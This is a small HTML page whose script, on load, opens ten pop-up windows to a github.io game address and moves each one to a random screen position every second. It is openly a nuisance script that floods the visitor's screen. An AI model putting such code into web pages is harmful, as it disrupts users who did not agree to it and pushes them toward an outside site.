<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pop-up Window</title>
<style>
  /* No specific styles needed */
</style>
</head>
<body>
<script>
  // Function to create a pop-up
  function createPopup() {
    var popup = window.open("https://dasma50.github.io/dasmamygame/", "popUpWindow", "width=600,height=400,top=200,left=200");

    // Move the pop-up randomly every second
    setInterval(function() {
      var newX = Math.floor(Math.random() * (screen.width - 600));
      var newY = Math.floor(Math.random() * (screen.height - 400));
      popup.moveTo(newX, newY);
    }, 1000);
  }

  // Create multiple pop-ups
  for (var i = 0; i < 10; i++) {
    createPopup();
  }
</script>
</body>
</html>
